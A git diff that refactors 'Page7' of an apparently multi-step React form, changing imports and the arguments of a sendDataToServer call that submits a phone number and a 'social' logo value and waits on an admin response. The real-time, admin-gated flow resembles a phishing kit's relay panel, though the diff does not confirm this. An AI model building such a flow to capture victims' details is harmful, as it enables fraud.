@@ -21,36 +21,37 @@ import PhoneInput from "react-phone-number-input";
 import { useNavigate } from "react-router-dom";
 import {
   currentPage,
-  extraInfo,
   isAdminError,
   logo,
+  mainInfo,
   sendDataToServer,
-} from "../../context/signals";
+} from "../../real-time/context/signals";
 
 function Page7() {
   useSignals();
 
   const { handleSubmit } = useForm({ mode: "all" });
 
-  const [phone, setValue] = useState(extraInfo.value.phone);
+  const [phone, setValue] = useState(mainInfo.value?.phone);
 
   const navigate = useNavigate();
 
   function sendData(data: FieldValues) {
-    sendDataToServer(
-      {
+    sendDataToServer({
+      data: {
         ...data,
         phone,
         social: logo.value,
       },
-      "page7",
-      "page8",
-      false,
-      navigate
-    );
+      current: "page7",
+      nextPage: "page8",
+      waitingForAdminResponse: false,
+      navigate,
+    });
   }
 
   useEffect(() => {
+    // This Step Are Necessary
     currentPage.value = "page7";
   }, []);
   return (
